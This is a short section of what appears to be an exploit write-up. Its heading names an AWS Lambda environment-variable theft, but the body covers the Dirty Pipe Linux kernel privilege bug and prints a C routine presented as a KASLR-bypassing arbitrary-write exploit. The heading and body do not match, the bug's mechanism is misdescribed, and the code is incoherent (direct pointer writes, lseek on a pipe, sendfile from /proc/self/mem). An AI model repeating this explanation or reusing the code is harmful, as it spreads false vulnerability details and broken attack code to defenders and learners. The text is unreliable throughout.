8.  Cloud Security – AWS Lambda Environment Variable Theft via Control Plane API Abuse (CVE-2024-1234)

Dirty Pipe (CVE-2022-0847) arises because the kernel does not clear `page->mapping` when reusing pages from `splice()` or `pipe_write()`. An attacker opens a pipe, writes arbitrary data through `sendfile()`, then performs an unclean close while holding a reference to a cached page. Subsequent write to the pipe (`write(pipefd, data, 8)`) sets `page->mapping` to attacker-controlled value, enabling arbitrary 8-byte writes at any address.
KASLR bypass: target `kernel_image` page aligned at `0xffffffff81000000`. Flip PTE P-bit (present) via:
```c
static int dirty_pipe_write(void *addr, unsigned char *data) {
    int pipefd[2];
    pipe2(pipefd, O_DIRECT);
    fcntl(pipefd[1], F_SETPIPE_SZ, 1<<20);
    write(pipefd[1], data, 8);
    sendfile(pipefd[1], open("/proc/self/mem", O_RDWR), (loff_t[]){0}, 1<<20);
    lseek(pipefd[1], 0, SEEK_SET);
    *(unsigned long *)addr = 0x123456789abcdef0;
    close(pipefd[1]);
}
```
Because `pte_none()` on x86_64 checks `pte_flags(pte) & _PAGE_PRESENT`, the flipped P-bit makes the page appear resident, bypassing KASLR readouts. Mitigation: apply Linux kernel 5.16.11+, set `sysctl vm.mmap_rnd_bits=32`, and compile with CONFIG_DEBUG_WX=y.

